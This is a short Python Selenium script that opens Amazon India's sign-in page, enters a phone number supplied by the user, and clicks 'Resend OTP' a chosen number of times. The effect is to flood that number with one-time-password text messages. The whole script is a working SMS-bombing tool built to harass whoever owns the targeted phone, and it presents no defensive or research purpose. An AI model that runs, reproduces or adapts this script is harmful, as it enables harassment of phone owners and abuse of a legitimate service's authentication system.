#take the phone number as input
phone_num = input('Enter the Phone Number:')
times= int(input('Enter the number of messages to be sent:'))

#Open google
from selenium import webdriver
browser=webdriver.Chrome("F:\\Education\\Alien Brains\\chromedriver.exe")

#open amazon sign in page
browser.get('https://www.amazon.in/ap/signin?openid.assoc_handle=inflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3F_encoding%3DUTF8%26ref_%3Dnavm_em_hd_re_signin&ref_=nav_em_hd_clc_signin_0_1_1_24')

#click on email or phone number ---finding input tag element
phone=browser.find_element_by_id('ap_email')

#send the phone number to the phone box
phone.send_keys(phone_num)

#click on continue
cont = browser.find_element_by_id('continue')
cont.click()

#click on get an OTP on your Phone
sendOTP = browser.find_element_by_id('continue')
sendOTP.click()

#for number of times
for i in range(times-1):
	#click on resend OTP
	resend=browser.find_element_by_link_text("Resend OTP")
	resend.click()

#close the browser
browser.quit()
